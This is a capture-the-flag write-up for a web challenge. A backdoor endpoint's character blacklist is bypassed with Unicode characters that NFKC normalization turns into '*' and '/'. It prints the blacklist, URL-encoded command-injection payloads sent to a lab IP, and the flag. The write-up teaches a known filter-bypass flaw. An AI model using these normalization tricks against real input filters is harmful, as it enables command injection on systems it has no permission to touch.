## Solve:

- [ ] Set of blacklisted characters (not allowed) <br>
  <sup>```blacklist = ["~","!","@","#","$","%","^","&","*","(",")","_","-","+","{","}","]","[","|","\\","|",";",",",".","<",">","?","/","`",":","\""]```</sup>

<br>

- [ ] If the characters introduced are not in the blacklist, the command given is **normalized** <br>
  ```norm = unicodedata.normalize("NFKC", cmd)```

<br>

- [ ] We can request regular commands, but in order to get the flag we need to bypass the blacklist. <br>
    We do this by using special characters in **Unicode** that are the equivalent of normal characters after **normalization**. <br>
    We see some examples here: https://lazarv.com/posts/unicode-normalization-vulnerabilities/

<br>

- [ ] After a series of commands, we find out where is the flag
  ```bash
  http://213.177.18.70:8004/backdoor?cmd=ls 
  http://213.177.18.70:8004/backdoor?cmd=cat%20%EF%B9%A1
  ```
  ![asterix](https://user-images.githubusercontent.com/93029180/208316737-a87ab1f1-678d-47ba-b01b-557a2ca9a6e6.png)
  
  Hint says the flag is temporary (in `tmp` directory)
  ```bash
  http://213.177.18.70:8004/backdoor?cmd=cat%20%EF%B9%A1
  http://213.177.18.70:8004/backdoor?cmd=cat%20%EF%BC%8Ftmp%EF%BC%8Fflag%EF%B9%A1
  ```
  ![flag](https://user-images.githubusercontent.com/93029180/208316828-d7dce247-f3f2-4a5e-a48e-2d30d207acb9.png)

<br>

## Flag:
`flag{normalizing_the_input_4_the_bypass}`
